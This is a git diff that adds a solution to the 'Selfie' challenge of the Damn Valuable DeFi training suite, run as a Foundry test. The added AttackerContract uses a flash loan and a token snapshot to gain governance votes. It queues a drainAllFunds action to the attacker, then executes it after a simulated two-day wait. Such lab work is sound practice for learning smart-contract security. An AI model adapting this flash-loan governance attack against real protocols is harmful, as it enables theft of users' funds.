@@ -10,6 +10,41 @@ import {DamnValuableTokenSnapshot} from "../../../Contracts/DamnValuableTokenSna
 import {SimpleGovernance} from "../../../Contracts/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../../Contracts/selfie/SelfiePool.sol";
 
+contract AttackerContract {
+    SimpleGovernance internal simpleGovernance;
+    SelfiePool internal selfiePool;
+    DamnValuableTokenSnapshot internal dvt;
+    address internal immutable attacker;
+
+    uint256 internal actionId;
+
+    constructor(SimpleGovernance _simpleGovernance, SelfiePool _selfiePool) {
+        simpleGovernance = _simpleGovernance;
+        selfiePool = _selfiePool;
+        dvt = simpleGovernance.governanceToken();
+        attacker = msg.sender;
+    }
+
+    function queueAction() external {
+        selfiePool.flashLoan(dvt.balanceOf(address(selfiePool)));
+    }
+
+    function receiveTokens(address _dvt, uint256 amount) external {
+        dvt.snapshot();
+        actionId = simpleGovernance.queueAction(
+            address(selfiePool),
+            abi.encodeWithSignature("drainAllFunds(address)", attacker),
+            0
+        );
+        dvt.transfer(address(selfiePool), amount);
+    }
+
+    function finishAttack() external {
+        simpleGovernance.executeAction(actionId);
+        dvt.transfer(attacker, dvt.balanceOf(address(this)));
+    }
+}
+
 contract Selfie is DSTest {
     Vm internal immutable vm = Vm(HEVM_ADDRESS);
 
@@ -49,7 +84,21 @@ contract Selfie is DSTest {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
 
+        AttackerContract attackerContract = new AttackerContract(
+            simpleGovernance,
+            selfiePool
+        );
+        vm.label(address(attackerContract), "AttackerContract");
+        attackerContract.queueAction();
+
+        // Wait for the next round
+        vm.warp(block.timestamp + 2 days);
+
+        attackerContract.finishAttack();
+
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
